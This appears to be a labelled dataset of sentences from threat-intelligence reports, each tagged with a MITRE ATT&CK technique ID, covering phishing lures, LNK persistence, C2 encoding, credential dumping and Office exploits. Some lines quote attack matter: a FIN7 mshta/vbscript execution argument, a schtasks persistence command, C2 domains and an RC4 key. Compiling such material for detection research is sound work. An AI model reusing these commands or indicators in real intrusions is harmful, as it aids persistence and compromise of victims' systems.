Additionally, in the event Kaspersky is detected, the malware will immediately run the ‘Conime.lnk’ shortcut file in a new process after it is created	['T1547.009']
This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim	['T1547.009']
In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file – two versions of the same LNK file and VBScript technique	['T1547.009']
This spawns the hidden embedded malicious LNK file in the document	['T1547.009']
Figure 3: FIN7 phishing lure persistence mechanisms Examining Attacker Shortcut Files In many cases, attacker-created LNK files can reveal valuable information about the attacker’s development environment	['T1547.009']
These files can be parsed with lnk-parser to extract all contents	['T1547.009']
LNK files have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address	['T1547.009']
The LNK file is finally used to identify a third file: a ZIP file	['T1547.009']
The LNK file is moved to the startup directory	['T1547.009']
This shortcut file points to the path of the previously written ‘Applet.cpl’ file	['T1547.009']
Finally, Reaver.v1 will execute the ‘~WUpdate.lnk’ file in a new process, thus loading the recently dropped malicious CPL file	['T1547.009']
Finally, Reaver.v2 will execute the ‘~Update.lnk’ file in a new process, thus loading the recently dropped malicious CPL file	['T1547.009']
This shortcut file calls the built-in ‘control.exe’ utility to in turn load the previously dropped malicious CPL file of ‘winhelp.cpl’	['T1547.009']
The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier	['T1547.009']
Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence	['T1547.009']
2 Successful payload download Astaroth’s initial payload is a malicious .lnk file, a common delivery method used by threat actors	['T1547.009']
Malicious .lnk files contain a link to a URL (instead of the expected local URI) to grab the next payload	['T1547.009']
In the case of Astaroth trojan, the .lnk file contains an argument into WMIC.exe to run in non-interactive mode, which forgoes opening a window that the victim could notice, to download the hardcoded url in the .lnk	['T1547.009']
Encoded Payload   Decoded Payload     MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server	['T1132']
Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication	['T1132']
The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform	['T1132']
The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands:  Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h  Malware checking to make sure a received command is in the correct range	['T1132']
If the size is 7 bytes or more, the backdoor verifies that the command and control server sent an encoded package	['T1132']
The generated buffer is encoded using the BASE64 alphabet to be sent in the POST request	['T1132']
In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12)	['T1132']
Data that is sent is compressed and then base64-encoded before being included in the requests	['T1132']
The C2 server sends back Base64 encoded response	['T1132']
The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:   <domain>\<username>:pass   The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)	['T1132']
A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration	['T1132']
Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories	['T1132']
Once the host-based enumeration information was obtained, it was base64-encoded and then appended to the URL post request to a C2, whereas in previous versions this information was written to a text file.	['T1132']
The actor has used several notable techniques in these incidents such as sniffing passwords from Wi-Fi traffic, poisoning the NetBIOS Name Service, and spreading laterally via the EternalBlue exploit.  APT28 Uses Malicious Document to Target Hospitality Industry FireEye has uncovered a malicious document sent in spear phishing emails to multiple companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July	['T1598.002']
Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload	['T1598.002']
Figure 1: Contents of the Email A review of the email header data from the spear phishing messages showed that the threat actors sent the emails using the same infrastructure they have used in the past	['T1598.002']
In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment	['T1598.002']
Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:  Taiwan government IT service vendor in Asia Journalist of a Tibetan radio station   Figure 6 Email sent to Journalist of Tibetan radio station   Malicious Macros The malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document	['T1598.002']
APT32 actors continue to deliver the malicious attachments via spear-phishing emails	['T1598.002']
The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the “attachedTemplate” technique to load a template from a remote server	['T1598.002']
The attack involved a spear-phishing email with a subject of “Project Offer” and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment	['T1598.002']
Phishing emails with political themes were used in the majority of the observed attack emails	['T1598.002']
Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document	['T1598.002']
Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016	['T1598.002']
The spear phishing emails and attached malicious macro documents typically have geopolitical themes	['T1598.002']
The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite	['T1598.002']
We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)	['T1598.002']
This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments	['T1598.002']
Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018	['T1598.002']
In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware	['T1598.002']
Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization	['T1598.002']
This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)	['T1598.002']
In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment	['T1598.002']
In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle	['T1598.002']
The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars	['T1598.002']
Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments	['T1598.002']
"Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named ""미북 정상회담 전망 및 대비.hwp"" (Prospects for US-North Korea Summit .hwp)"	['T1598.002']
Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments	['T1598.002']
The case we found arrived through a targeted email that contained a document file (in docx format).	['T1598.002']
APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets.	['T1598.002']
Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3	['T1204']
Successful execution of the macro within the malicious document results in the installation of APT28’s signature GAMEFISH malware	['T1204']
Once the user enables macros, the macro will perform the following actions:  Displays decoy content Checks for the existence of a file at %APPDATA%\wscript.exe If %APPDATA%\wscript.exe does not exist, the macro converts an embedded hex-encoded string into bytes and saves this data to the %APPDATA%\wscript.exe	['T1204']
None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1	['T1204']
"Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches “mshta.exe” with the following arguments passed to it: vbscript:Execute(""On Error Resume Next:set w=GetObject(,""""Word.Application""""):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close"") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2"	['T1204']
Malicious processes are marked red (click image to enlarge):  The following malicious files are dropped and run:  C:\ProgramData\{2ED05C38-D464-4188-BC7F-F6915DE8D764}\OFFLINE\9A189DFE\C7B7C186\main.vbs dcac79d7dc4365c6d742a49244e81fd0 C:\Users\Public\Libraries\RecordedTV\DnE.ps1 7fe0cb5edc11861bc4313a6b04aeedb2 C:\Users\Public\Libraries\RecordedTV\DnS.ps1 3920c11797ed7d489ca2a40201c66dd4 “C:\Windows\System32\schtasks.exe” /create /F /sc minute /mo 3 /tn “GoogleUpdateTasksMachineUI” /tr C:\Users\Public\Libraries\RecordedTV\backup.vbs 7528c387f853d96420cf7e20f2ad1d32  Command and control server is located in the following domain: tecsupport[.]in A detailed analysis of the malware is provided in two posts by Palo Alto networks and in a post by FireEye, which wrote about previous campaigns by this threat agent	['T1204']
This document was a decoy aimed to entice the user to open malicious documents embedded further down the pageThe actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea	['T1204']
Email attacks often use “click-worthy” or interesting topics to convince users to click links or open attachments that could lead to various threats	['T1204']
Users are advised to avoid opening attachments and click links on unsolicited emails	['T1204']
These Honeybee documents did not contain any specific lures, rather variations of a “not compatible” message attempting to convince the user to enable content	['T1204']
Additionally, a small number of campaigns over this same period also made use of various file-sharing platforms like Dropbox for hosting the malicious documents rather than directly attaching them to the messages themselves.Figure 2: Example malicious Excel documentSimilar to the technique described in our previous blog about Remcos, the contents of the documents have been intentionally made to appear as if they are blurry, with the user being prompted to enable editing to have a clearer view of the contents	['T1204']
By default, Excel does not allow the download of data from the remote server, but will ask for the user’s consent by presenting the dialog box in Figure 2:  Figure 2 Excel security notice for .iqy files By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file	['T1204']
The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on “Enable Content” as seen in Figure 2	['T1204']
Message 3:    Headers Received: by mailcenter.support   Sender Mercator Institute for China Studies <publications@mericcs.org>   Subject Authoritarian advance Responding to Chinas growing political influence in Europe   Body Content and images included within the e-mail body were a direct copy of the following MERICS report:  https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf   Notes The hyperlinked text Click here to download the report within the e-mail body lead to a malicious RTF document located at the URL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc	['T1204']
By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes small footprint can help enable evasion of automated detection mechanisms based on macro content	['T1204']
In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics.	['T1204']
Once a user has double-clicked the embedded image, the form executes a VB setup script	['T1204']
"The threat actors also took additional steps to replace some variable strings in the more recent samples, likely in an attempt to avoid signature-based detection from Yara rules. Once the document was opened, it prompted the user to enable the macro titled ""BlackWater.bas""."	['T1204']
The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5	['T1553.002']
By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process	['T1553.002']
FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads	['T1553.002']
In these websites they hosted malware that was digitally signed with a valid, likely stolen code signing certificate Based on VirusTotal uploads, malicious documents content, and known victims – other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon	['T1553.002']
Digitally signed malware The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:  Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth sample, 1c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate: Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48 This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network	['T1553.002']
They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally-signed malware to avoid detection or blocking during their infection phases	['T1553.002']
Stolen code signing certificates used to sign malware	['T1553.002']
Many of this APT’s components are signed with phony Intel and AMD digital certificates	['T1553.002']
Based upon the instructional guide and the provided tools, this package appears consistent with the methodologies FireEye outlined in their research on how these attacks were executed, including specific details such as the use of ICAP via a proxy passthrough, in this case specifically squid, and using certbot to create a Let’s Encrypt SSL certificate	['T1573']
The backdoor's infrequent beaconing, traffic obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identification of its network traffic difficult	['T1573']
Encrypting communications using AES and RSA public key cryptography   5	['T1573']
Figure 12 and Figure 13 show the RSA keys used in FELIXROOT, and Figure 14 shows the AES encryption parameters	['T1573']
Figure 19. Scrambling ‘Mac OSX 10.12’  Encryption  The scrambled byte sequence is passed onto the constructor of the class Packet::Packet, which creates a random AES256 key and encrypts the buffer with this key	['T1573']
It first grabs an encrypted blob stored away in a global variable and pulls out 381 bytes of this encrypted data:  The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key “\x8B\xFF\x55\x8B\xEC\x83\xEC\x50\xA1\x84\x18\x03\x68\x33\xC9\x66\xF7\x45\x10\xE8\x1F\x89\x45\xFC\x8B\x45\x14\x56″	['T1573']
These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949	['T1102']
Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection	['T1102']
In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process	['T1102']
Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications	['T1102']
This RAT communicates with 5.189.145.248, a command and control (C2) IP address that this group has used previously with other malware, including DarkComet and NJRAT	['T1102']
BRONZE UNION appears to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operational infrastructure	['T1102']
LOWBALL abuses the Dropbox cloud storage service for command and control (CnC)	['T1102']
The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3] A Cyber Campaign Likely Intended to Monitor Hong Kong Media During a Period of Crisis The threat group has previously used newsworthy events as lures to deliver malware.[4] They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.[5] The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China	['T1102']
Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:       216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com     Additionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from	['T1102']
The string is formatted as “<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>”   ^slp Sets the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands available within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode	['T1102']
This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API	['T1102']
To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account	['T1102']
Figure 4 x_mode command and new line delimited settings As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive	['T1102']
Figure 6 Hardcoded Google Drive URL used in RogueRobin sample When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive	['T1102']
To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c.<C2 domain> The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier	['T1102']
Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure	['T1102']
The Delphi variant of Cannon does not use legitimate web-based email services for its C2 communications, instead opting to use email accounts at an actor owned domain, ambcomission[.]com	['T1102']
Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com and pomf.cat were used as channels for the different malware stages before achieving a full RAT implementation, which then communicates with the corresponding C2 server	['T1102']
However, the attacks different stages were hosted on a variety of free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat	['T1102']
The command index table and command handler address table.  Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks:  Recursively generate a list of files in a directory and send to the control server Terminate a specific process	['T1102']
The actor has the following demonstrated capabilities:To include exploits (for Hangul and Microsoft Office) in its workflows.To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms	['T1102']
Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire	['T1102']
The majority of documents used the name “gerry knight” for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names	['T1102']
This tactic uses public web services to host content that contains encoded commands that are decoded by the malware	['T1102']
This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:  Figure 7 Dead drop resolver used by BADNEWS   In order to decrypt this data, the authors have included additional steps from previous versions	['T1102']
Some of the targeted apps were:    Whatsapp  YouTube Video Downloader  Google Update   Instagram  Hack Wifi   AirDroid   WifiHacker     Facebook   Photoshop   SkyTV     Hotstar  Trump Dash   PokemonGo  With many more to come	['T1102']
Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal	['T1102']
An increasingly popular tactic by threat actors is to use legitimate hosting services like Google Cloud or CloudFlare for their payload and C2  infrastructure, making it much more difficult to safely block IPs	['T1102']
Hidden Content The primary command and control location used in this campaign is hosted on a blog on blogspot[.]com, which enables the threat actors to hide their malicious content behind a legitimate service	['T1102']
In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com	['T1102']
five threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service	['T1102']
Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'	['T1018']
Once inside the network of a hospitality company, APT28 sought out machines that controlled both guest and internal Wi-Fi networks. No guest credentials were observed being stolen at the compromised hotels; however, in a separate incident that occurred in Fall 2016, APT28 gained initial access to a victim’s network via credentials likely stolen from a hotel Wi-Fi network.  Upon gaining access to the machines connected to corporate and guest Wi-Fi networks, APT28 deployed Responder	['T1018']
At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:   Information Gathering: Conducted research into an organization’s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions	['T1018']
Host enumeration and lateral movement After gaining an initial foothold in a compromised environment, the threat actors quickly identify and explore accessible systems	['T1018']
In one example, BRONZE UNION actors leveraged initial web shell access on Internet-facing systems to conduct internal reconnaissance, including domain enumeration and network state, via ipconfig, net use, net user, and net view commands	['T1018']
This technique allows them to map network resources and make lateral movements inside the network, landing in the perfect machine to match the attacker’s interest	['T1018']
APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets	['T1003']
During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump	['T1003']
APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors	['T1003']
The datasets included:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs)	['T1003']
In total, nearly 13,000 sets of credentials are included in the data dump	['T1003']
It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump	['T1003']
Assuming the lists of credentials are valid, the mass collection confirms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy	['T1003']
When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials	['T1003']
Credential Harvesting Attack On June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East	['T1003']
Figure 2 Employee survey displayed after credential theft The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3	['T1003']
Figure 3 Password handover form displayed after credential theft The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150	['T1003']
Figure 6 Authentication dialog box with fake credentials entered On the C2 server, we observed Phishery receiving the inbound request and capturing the credentials, as seen in Figure 7	['T1003']
The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session	['T1003']
This private data includes stored passwords, login credential information from Web browsers, and a variety of cryptocurrency wallets	['T1003']
Alerts for credential theft tools and privileged account lockouts should be investigated	['T1003']
(Source: Dell SecureWorks)   TG-3390 actors have also used the following publicly available tools:  Windows Credential Editor (WCE) — obtains passwords from memory gsecdump — obtains passwords from memory winrar — compresses data for exfiltration nbtscan — scans NetBIOS name servers  Tactics, techniques, and procedures Incident response engagements have given CTU researchers insight into the tactics TG-3390 employs during intrusions	['T1003']
15 Database dump Decoded, it reveals a detailed log of each affected machine	['T1003']
Mimikatz to obtain credentials.	['T1003']
It was heavily modified, with almost all original code stripped out aside from its sekurlsa::logonpasswords credential stealing feature	['T1003']
Domains The RoyalCli backdoor was attempting to communicate to the following domains:  News.memozilla[.]org video.memozilla[.]org  The BS2005 backdoor utilised the following domains for C2:  Run.linodepower[.]com Singa.linodepower[.]com log.autocount[.]org  RoyalDNS backdoor was seen communicating to the domain:  andspurs[.]com  Possible linked APT15 domains include:  Micakiz.wikaba[.]org cavanic9[.]net ridingduck[.]com zipcodeterm[.]com dnsapp[.]info   Published date:  10 March 2018   Written by:  Rob Smallridge	['T1008']
In order to extend the lifespan of the domains in case one or more are blacklisted, there are twelve different C2 domains that xparis() can be set to	['T1008']
Indicators of Compromise (IoCs)    C&C servers    Ssl[.]arkouthrie[.]com   s3[.]hiahornber[.]com   widget[.]shoreoa[.]com       SHA256   Delivery document (W2KM_OCEANLOTUS.A): 2bb855dc5d845eb5f2466d7186f150c172da737bfd9c7f6bc1804e0b8d20f22a   Dropper (OSX_OCEANLOTUS.D): 4da8365241c6b028a13b82d852c4f0155eb3d902782c6a538ac007a44a7d61b4   Backdoor (OSX_OCEANLOTUS.D): 673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f   The post New MacOS Backdoor Linked to OceanLotus Found appeared first on	['T1008']
Additionally malware reports itself to its hardcoded command and control servers and established a backdoor connection, so the attacker may have a permanent remote connection	['T1008']
Business and government personnel who are traveling, especially in a foreign country, often rely on systems to conduct business other than those at their home office, and may be unfamiliar with threats posed while abroad	['T1083']
These files are downloaded to a directory (C:\Users\Public\Libraries\tempsys) on the infected machine by Bxaki() and xparis()	['T1083']
In this particular case in 2013, the config file included an unknown plugin set, aside from the usual ‘ddos’ plugin listing	['T1083']
The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php	['T1083']
The body of the POST request may contain files contained in the cabinet format	['T1083']
Figure 3 – A list of file extensions targeted for destruction by new variant of KillDisk component As well as being able to delete system files to make the system unbootable – functionality typical for such destructive trojans – the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems	['T1083']
This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing	['T1083']
HD Creates a file in the Temp path and names it “hd” + PCID then invokes another program module named hd.test1 to identify logical drives	['T1083']
Implant directory contained in the malicious Flash file	['T1083']
Otherwise, it runs a search for the “/bin/rsyncd” string within the files found in the /etc/ folder	['T1083']
watch/?   search/?  find/?    results/? open/?    search/?  close/?   The “ai” value stands for the payload title	['T1083']
The file names may vary from one version of the malware to another	['T1083']
In one version of the malware, the code checks if the “ProgramData” folder has folders or files with the keywords “Kasper“, “Panda“, or “ESET“	['T1083']
It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file	['T1083']
The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files	['T1083']
Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files	['T1083']
4 Upload edg499.dat, which includes the list of interesting files	['T1083']
Since it is a very long term group, some victims may be impossible to identify now	['T1083']
PHOTO: a DLL backdoor also reported publicly as “Derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files	['T1083']
This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime	['T1083']
With the exception of the ‘Speed’ method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list:    ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK    The last two methods in the chain carry out a majority of the first payload’s functionality	['T1083']
Hashes For a list of all hashes of malware encountered during this campaign, please refer to the following file	['T1083']
17-3 Function names To target specific victims, Astaroth is locale aware; any attempts to run the malware without locale spoofing will result in failed downloads and the inability to run the .dll files	['T1083']
119 readFiles Obtains file information on a file or a folder, and supports a “*” wildcard and recursive file list	['T1083']
Get Directory Information The malware gets information for the provided directory address using the following WINAPI calls:	['T1083']
dir c:\	['T1083']
2, 2018, we published a blog detailing the use of an Adobe Flash zero-day vulnerability (CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper)	['T1203']
Observed vulnerabilities include:  CVE-2012-0158  CVE-2017-0199  CVE-2017-8759  CVE-2017-11882       Figure 2: APT40 attack lifecycle  Establish Foothold APT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups	['T1203']
On October 10, 2017, Kaspersky Lab’s advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers	['T1203']
We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by FireEye in September 2017.  The FinSpy payload used in the current attacks (CVE-2017-11292) shares the same command and control (C2) server as the payload used with CVE-2017-8759 uncovered by FireEye	['T1203']
What does it mean for everyone and how to defend against such attacks, including zero-day exploits? For CVE-2017-11292 and other similar vulnerabilities, one can use the killbit for Flash within their organizations to disable it in any applications that respect it.  Unfortunately, doing this system-wide is not easily done, as Flash objects can be loaded in applications that potentially do not follow the killbit	['T1203']
This document exploited a newer vulnerability, CVE-2017-0199	['T1203']
This change is because Group 123 did not target South Korea during this campaign and Microsoft Office is standard in the rest of the world.Infection VectorsThe attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA document inside of Microsoft Office	['T1203']
Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can´t prove they were related to this particular attack	['T1203']
This time, weaponized lure documents claiming to contain seminar information on environmental protection were observed exploiting known Microsoft Office vulnerabilities CVE-2017-0199 and CVE-2017-11882 to drop and execute the backdoor binary on the victim’s machine	['T1203']
In this campaign, we observed threat actors exploiting CVE-2017-0199 and CVE-2017-11882 to distribute malware	['T1203']
Conclusion CVE-2017-0199 and CVE-2017-11882 are two of the more commonly exploited vulnerabilities that we are currently seeing	['T1203']
Figure 3: Embedded URL in OLE object CVE-2017-11882 Similarly, we have also observed actors leveraging another recently discovered vulnerability (CVE-2017-11882) in Microsoft Office	['T1203']
In many cases, additional stealers, RATs, and other malware were observed being hosted on the same web servers.Analysis of HawkEye Reborn The campaign starts with sending the aforementioned Excel sheets that exploit the well-known CVE-2017-11882 vulnerability, an arbitrary code execution bug in Microsoft Office	['T1203']
Less than a week after Microsoft issued a patch for CVE-2017-11882 on Nov	['T1203']
14, 2017, FireEye observed an attacker using an exploit for the Microsoft Office vulnerability to target a government organization in the Middle East	['T1203']
In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER	['T1203']
